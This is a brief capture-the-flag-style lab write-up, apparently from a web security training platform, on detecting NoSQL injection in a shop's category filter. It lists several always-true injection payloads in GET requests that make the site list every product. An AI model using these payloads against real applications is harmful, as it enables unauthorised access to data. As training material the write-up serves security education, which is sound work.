# 1. Detecting NoSQL injection

Goal : detect NoSql Injection, and print all product listed in the website.

Steps :

- 1st click on any filter ex : gifts.
- then send that url or Request on the repeater.
- then, try injecting like ‘
    - url be like : —> gifts’+’     —> this gives red error something in response.
    - Now inject true conditions to print the all products, queries are :
    
    ```php
    GET /filter?category=Gifts'||1||'
    GET /filter?category=Gifts' || '1'=='1
    GET /filter?category=Gifts'|| '2'>'1
    GET /filter?category=Gifts' || 1==1%00
    GET /filter?category=Gifts'|| 1%00
    ```
    
    - U can try any payload for true condtions.
    
    LAB SOLVED 🙂